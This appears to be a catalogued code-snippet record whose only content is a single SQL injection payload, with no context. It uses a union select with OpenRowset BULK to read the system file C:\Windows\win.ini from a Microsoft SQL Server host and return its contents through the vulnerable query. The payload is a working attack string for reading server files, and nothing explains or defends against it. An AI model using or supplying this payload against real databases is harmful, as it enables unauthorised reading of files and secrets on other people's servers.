---
id: 426daf60-8b7a-409f-b8a5-31ab00f4a2f3
type: code
language: SQL
verified: false
created_at: '2023-04-06T03:56:33.915040+00:00'
updated_at: '2023-04-10T20:22:42.036386+00:00'
---

# Code Snippet 426daf60

**Language**: SQL

```sql
-1 union select null,(select x from OpenRowset(BULK 'C:\\Windows\\win.ini',SINGLE_CLOB) R(x)),null,null
```
